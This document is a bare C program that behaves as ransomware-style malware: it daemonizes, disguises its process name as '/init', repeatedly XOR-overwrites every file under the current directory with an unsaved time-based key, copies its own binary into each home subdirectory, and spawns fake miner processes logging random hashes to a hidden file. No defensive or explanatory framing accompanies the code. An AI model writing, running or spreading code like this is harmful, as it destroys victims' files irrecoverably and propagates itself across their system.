#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <time.h>
#include <dirent.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
#include <openssl/sha.h>
#include <zip.h>

#define INTERVAL 30
#define MAX_MINERS 3

void encrypt_file(const char *filename, int key) {
    FILE *file = fopen(filename, "rb+");
    if (!file) return;

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *buffer = malloc(size);
    fread(buffer, 1, size, file);

    for (long i = 0; i < size; i++) {
        buffer[i] ^= key;
    }

    fseek(file, 0, SEEK_SET);
    fwrite(buffer, 1, size, file);
    fclose(file);
    free(buffer);
}

void encrypt_folder_recursive(const char *dirname, int key) {
    DIR *dir;
    struct dirent *entry;
    char path[1024];

    if (!(dir = opendir(dirname))) return;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", dirname, entry->d_name);

        if (entry->d_type == DT_DIR) {
            encrypt_folder_recursive(path, key);
        } else {
            encrypt_file(path, key);
        }
    }
    closedir(dir);
}

void generate_random_hash(char *output) {
    const char charset[] = "0123456789abcdef";
    for (int i = 0; i < 64; i++) {
        output[i] = charset[rand() % 16];
    }
    output[64] = '\0';
}

void miner_process(int id) {
    srand(time(NULL) ^ (getpid() << 16));
    char log_entry[256];
    char hash[65];
    FILE *log_file;
    
    while (1) {
        int sleep_time = (rand() % 28) + 3;
        sleep(sleep_time);
        
        generate_random_hash(hash);
        
        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);
        
        strftime(log_entry, sizeof(log_entry), "[%Y-%m-%d %H:%M:%S]", tm_info);
        sprintf(log_entry + strlen(log_entry), "[Miner %02d] %s", id, hash);
        
        log_file = fopen("/tmp/.miner.log", "a");
        if (log_file) {
            fprintf(log_file, "%s\n", log_entry);
            fclose(log_file);
        }
    }
}

void trojan_spread() {
    char *home = getenv("HOME");
    if (!home) return;

    DIR *dir;
    struct dirent *entry;
    char path[1024];
    char command[2048];
    
    if ((dir = opendir(home))) {
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && 
                strcmp(entry->d_name, "..") != 0) {
                snprintf(path, sizeof(path), "%s/%s", home, entry->d_name);
                snprintf(command, sizeof(command), "cp /proc/self/exe %s/rumme", path);
                system(command);
            }
        }
        closedir(dir);
    }
}

int main(int argc, char *argv[]) {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    
    umask(0);
    setsid();
    
    strcpy(argv[0], "/init");
    
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Main loop
    while (1) {
        int key = time(NULL);
        
        encrypt_folder_recursive(".", key);
        
        trojan_spread();
        
        for (int i = 0; i < MAX_MINERS; i++) {
            if (fork() == 0) {
                miner_process(i);
                exit(0);
            }
        }
        
        sleep(INTERVAL);
    }
    
    return EXIT_SUCCESS;
}
